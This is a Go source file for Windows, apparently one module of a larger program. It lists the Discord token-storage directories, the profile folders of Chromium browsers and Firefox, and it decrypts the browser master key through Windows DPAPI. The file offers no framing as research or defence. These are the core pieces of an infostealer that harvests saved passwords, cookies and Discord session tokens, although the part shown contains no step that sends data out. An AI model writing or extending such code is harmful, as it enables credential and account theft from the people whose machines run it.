//go:build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"unsafe"

	"golang.org/x/sys/windows"
)

var errMissingDPAPI = os.ErrNotExist

// discordDataDirs returns the Local Storage leveldb dirs of Discord desktop apps.
func discordDataDirs() []string {
	appdata := os.Getenv("APPDATA")
	var dirs []string
	for _, name := range []string{"discord", "discordcanary", "discordptb", "discorddevelopment"} {
		dirs = append(dirs, filepath.Join(appdata, name, "Local Storage", "leveldb"))
	}
	return dirs
}

type browserEntry struct {
	name        string
	userDataDir string
}

// chromiumBrowsers returns the User Data roots of Chromium-based browsers.
func chromiumBrowsers() []browserEntry {
	local := os.Getenv("LOCALAPPDATA")
	roaming := os.Getenv("APPDATA")
	return []browserEntry{
		{"chrome", filepath.Join(local, "Google", "Chrome", "User Data")},
		{"edge", filepath.Join(local, "Microsoft", "Edge", "User Data")},
		{"brave", filepath.Join(local, "BraveSoftware", "Brave-Browser", "User Data")},
		{"vivaldi", filepath.Join(local, "Vivaldi", "User Data")},
		{"opera", filepath.Join(roaming, "Opera Software", "Opera Stable")},
		{"operagx", filepath.Join(roaming, "Opera Software", "Opera GX Stable")},
	}
}

// firefoxProfiles returns the Firefox profile directories.
func firefoxProfiles() []string {
	base := filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
	entries, err := os.ReadDir(base)
	if err != nil {
		return nil
	}
	var out []string
	for _, e := range entries {
		if e.IsDir() {
			out = append(out, filepath.Join(base, e.Name()))
		}
	}
	return out
}

// masterKey reads and DPAPI-decrypts the os_crypt key from stateDir/Local State.
func masterKey(stateDir string) ([]byte, error) {
	raw, err := os.ReadFile(filepath.Join(stateDir, "Local State"))
	if err != nil {
		return nil, err
	}
	var ls struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(raw, &ls); err != nil {
		return nil, err
	}
	enc, err := base64.StdEncoding.DecodeString(ls.OSCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	if len(enc) < 5 || string(enc[:5]) != "DPAPI" {
		return nil, errMissingDPAPI
	}
	return dpapiDecrypt(enc[5:])
}

func dpapiDecrypt(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, errMissingDPAPI
	}
	var out windows.DataBlob
	in := windows.DataBlob{Size: uint32(len(data)), Data: &data[0]}
	if err := windows.CryptUnprotectData(&in, nil, nil, 0, nil, 0, &out); err != nil {
		return nil, err
	}
	defer windows.LocalFree(windows.Handle(unsafe.Pointer(out.Data)))
	res := make([]byte, out.Size)
	copy(res, unsafe.Slice((*byte)(unsafe.Pointer(out.Data)), int(out.Size)))
	return res, nil
}
